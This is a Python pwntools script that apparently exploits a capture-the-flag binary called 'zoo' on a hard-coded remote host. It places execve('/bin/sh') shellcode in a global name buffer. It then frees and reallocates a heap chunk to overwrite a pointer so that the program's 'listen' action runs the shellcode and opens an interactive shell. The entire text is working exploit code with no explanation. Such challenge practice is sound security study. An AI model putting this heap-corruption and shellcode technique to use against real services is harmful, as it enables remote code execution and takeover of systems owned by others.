from pwn import *

def adddog(data):
    r.recvuntil('choice :')
    r.sendline('1')
    r.recvuntil('Name :')
    r.sendline(data)
    r.recvuntil('Weight :')
    r.sendline('1')

def listen(index):
    r.recvuntil('choice :')
    r.sendline('3')
    r.recvuntil('animal :')
    r.sendline(str(index))

def remove(index):
    r.recvuntil('choice :')
    r.sendline('5')
    r.recvuntil('animal :')
    r.sendline(str(index))

name = 0x605420
animallist = 0x605490
r = process('./zoo')
r = remote('140.110.112.77', 2128)
raw_input('debug: ')
r.recvuntil('zoo :')
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' 
r.sendline('a' * 8 + p64(name + 0x10) + shellcode)

adddog('aaaa')
adddog('bbbb')
adddog('cccc')
remove(1)
adddog('a' * 0x48 + p64(name + 8))
listen(1)
r.interactive()
